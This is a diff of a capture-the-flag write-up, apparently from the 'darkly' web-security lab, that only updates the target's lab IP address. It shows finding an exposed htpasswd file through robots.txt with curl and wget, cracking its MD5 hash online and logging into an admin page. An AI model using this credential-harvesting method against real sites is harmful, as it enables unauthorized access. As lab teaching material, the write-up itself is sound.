@@ -1,15 +1,15 @@
 # Admin(htpasswd)
 
-If we go to <http://192.168.31.133/robots.txt> we will find 2 folders disallowed - `/whatever` and `/.hidden`.
-Let's check <http://192.168.31.133/whatever/>
+If we go to <http://192.168.31.135/robots.txt> we will find 2 folders disallowed - `/whatever` and `/.hidden`.
+Let's check <http://192.168.31.135/whatever/>
 
 ```
-daniseed@DESKTOP:~/darkly$  curl -v 192.168.31.133/whatever/
-*   Trying 192.168.31.133:80...
+daniseed@DESKTOP:~/darkly$  curl -v 192.168.31.135/whatever/
+*   Trying 192.168.31.135:80...
 * TCP_NODELAY set
-* Connected to 192.168.31.133 (192.168.31.133) port 80 (#0)
+* Connected to 192.168.31.135 (192.168.31.135) port 80 (#0)
 > GET /whatever/ HTTP/1.1
-> Host: 192.168.31.133
+> Host: 192.168.31.135
 > User-Agent: curl/7.68.0
 > Accept: */*
 >
@@ -28,14 +28,14 @@ daniseed@DESKTOP:~/darkly$  curl -v 192.168.31.133/whatever/
 <a href="htpasswd">htpasswd</a>                                           29-Jun-2021 18:09                  38
 </pre><hr></body>
 </html>
-* Connection #0 to host 192.168.31.133 left intact
+* Connection #0 to host 192.168.31.135 left intact
 
 
-*   Trying 192.168.31.133:80...
+*   Trying 192.168.31.135:80...
 * TCP_NODELAY set
-* Connected to 192.168.31.133 (192.168.31.133) port 80 (#0)
+* Connected to 192.168.31.135 (192.168.31.135) port 80 (#0)
 > GET /whatever/htpasswd HTTP/1.1
-> Host: 192.168.31.133
+> Host: 192.168.31.135
 > User-Agent: curl/7.68.0
 > Accept: */*
 >
@@ -51,15 +51,15 @@ daniseed@DESKTOP:~/darkly$  curl -v 192.168.31.133/whatever/
 < Accept-Ranges: bytes
 <
 root:437394baff5aa33daa618be47b75cb49
-* Connection #0 to host 192.168.31.133 left intact
+* Connection #0 to host 192.168.31.135 left intact
 ```
 
 OR
 
 ```
-daniseed@DESKTOP:~/darkly$ wget http://192.168.31.133/whatever/htpasswd
---2023-05-09 18:05:11--  http://192.168.31.133/whatever/htpasswd
-Connecting to 192.168.31.133:80... connected.
+daniseed@DESKTOP:~/darkly$ wget http://192.168.31.135/whatever/htpasswd
+--2023-05-09 18:05:11--  http://192.168.31.135/whatever/htpasswd
+Connecting to 192.168.31.135:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 38 [application/octet-stream]
 Saving to: ‘htpasswd’
@@ -79,7 +79,7 @@ We have login-password combination: `root:437394baff5aa33daa618be47b75cb49`
 But it doesn't work on its own. So lets try and dehash it with [crackstation](https://crackstation.net/).
 The password is encrypted with md5 - `qwerty123@`
 
-Input this on <http://192.168.31.133/admin/> and we have our flag
+Input this on <http://192.168.31.135/admin/> and we have our flag
 
 ## Explanation
 
